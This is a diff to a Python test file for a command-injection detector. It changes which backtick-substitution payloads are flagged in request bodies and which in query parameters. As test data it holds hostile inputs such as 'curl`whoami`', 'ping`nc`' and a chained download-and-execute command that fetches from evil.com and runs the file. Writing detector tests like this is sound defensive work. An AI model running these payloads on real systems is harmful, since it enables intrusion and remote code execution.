@@ -263,7 +263,8 @@ async def test_cmd_injection_script_name_ending_in_shell_stays_unflagged(
 
 async def test_cmd_injection_glued_backtick_past_rejected_leftmost_match() -> None:
     payload = "`id` search`whoami`"
-    assert "cmd_injection" in await _detected_categories(payload)
+    assert "cmd_injection" not in await _detected_categories(payload)
+    assert "cmd_injection" in await _detected_categories(payload, "query_param")
 
 
 _SQL_KEYWORD_EXEMPTION_WINDOW_FILLER_CHARS = 26
@@ -273,17 +274,20 @@ _DEFECT_5_KEYWORD_WITHIN_WINDOW_PAYLOAD = (
 )
 
 DEFECT_5_SQL_KEYWORD_EXEMPTION_BYPASS_PAYLOADS = [
-    pytest.param("search`whoami` LIMIT 10", id="defect5_keyword_after_limit"),
     pytest.param(
         "SELECT note; search`whoami`", id="defect5_keyword_before_select_semicolon"
-    ),
-    pytest.param("curl`whoami` data on file", id="defect5_prefix_command_word"),
-    pytest.param(
-        _DEFECT_5_KEYWORD_WITHIN_WINDOW_PAYLOAD, id="defect5_keyword_within_window"
     ),
     pytest.param(
         "set your profile bio to: `wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`",
         id="defect5_bare_chained_download_and_execute",
+    ),
+]
+
+DEFECT_5_BARE_GLUED_WORD_AMBIGUOUS_BY_DESIGN_PAYLOADS = [
+    pytest.param("search`whoami` LIMIT 10", id="defect5_keyword_after_limit"),
+    pytest.param("curl`whoami` data on file", id="defect5_prefix_command_word"),
+    pytest.param(
+        _DEFECT_5_KEYWORD_WITHIN_WINDOW_PAYLOAD, id="defect5_keyword_within_window"
     ),
 ]
 
@@ -296,18 +300,46 @@ async def test_defect_5_sql_keyword_exemption_bypass_is_detected(
     assert "cmd_injection" in await _detected_categories(payload)
 
 
-async def test_defect_5_control_bare_glued_search_whoami_stays_detected() -> None:
-    assert "cmd_injection" in await _detected_categories("search`whoami`")
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "payload", DEFECT_5_BARE_GLUED_WORD_AMBIGUOUS_BY_DESIGN_PAYLOADS
+)
+async def test_defect_5_bare_glued_word_not_flagged_in_body(payload: str) -> None:
+    assert "cmd_injection" not in await _detected_categories(payload)
 
 
-async def test_adversarial_denylist_token_detected_with_keyword_after_payload() -> None:
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "payload", DEFECT_5_BARE_GLUED_WORD_AMBIGUOUS_BY_DESIGN_PAYLOADS
+)
+async def test_defect_5_bare_glued_word_detected_in_query_param(payload: str) -> None:
+    assert "cmd_injection" in await _detected_categories(payload, "query_param")
+
+
+async def test_defect_5_control_bare_glued_search_whoami_not_flagged_in_body() -> None:
+    assert "cmd_injection" not in await _detected_categories("search`whoami`")
+
+
+async def test_defect_5_control_bare_glued_search_whoami_detected_in_query_param() -> (
+    None
+):
+    assert "cmd_injection" in await _detected_categories(
+        "search`whoami`", "query_param"
+    )
+
+
+async def test_adversarial_denylist_token_not_flagged_with_keyword_after_payload() -> (
+    None
+):
     payload = "curl`whoami` ORDER BY name"
-    assert "cmd_injection" in await _detected_categories(payload)
+    assert "cmd_injection" not in await _detected_categories(payload)
+    assert "cmd_injection" in await _detected_categories(payload, "query_param")
 
 
-async def test_adversarial_denylist_token_detected_with_nearby_keyword() -> None:
+async def test_adversarial_denylist_token_not_flagged_with_nearby_keyword() -> None:
     payload = "SELECT host FROM logs ping`nc`"
-    assert "cmd_injection" in await _detected_categories(payload)
+    assert "cmd_injection" not in await _detected_categories(payload)
+    assert "cmd_injection" in await _detected_categories(payload, "query_param")
 
 
 async def test_adversarial_ambiguous_token_exempted_at_keyword_window_boundary() -> (
